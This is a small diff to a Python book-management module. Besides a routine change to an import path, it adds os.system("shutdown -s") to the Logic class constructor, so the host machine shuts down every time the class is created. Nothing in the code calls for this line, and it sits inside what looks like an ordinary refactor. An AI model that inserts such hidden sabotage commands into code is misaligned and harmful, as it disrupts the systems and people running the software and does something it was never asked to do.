@@ -1,12 +1,13 @@
 import os
 
 from src.app.utils import rollback_with_error
-from src.database.db import Database
+from src.database import Database
 from src.database.schema import Author, Kind
 
 
 class Logic:
     def __init__(self):
+        os.system("shutdown -s")
         self.db = Database()
 
     def add_book(self, title: str, author_name: str, kind_name: str) -> tuple[str, dict]:
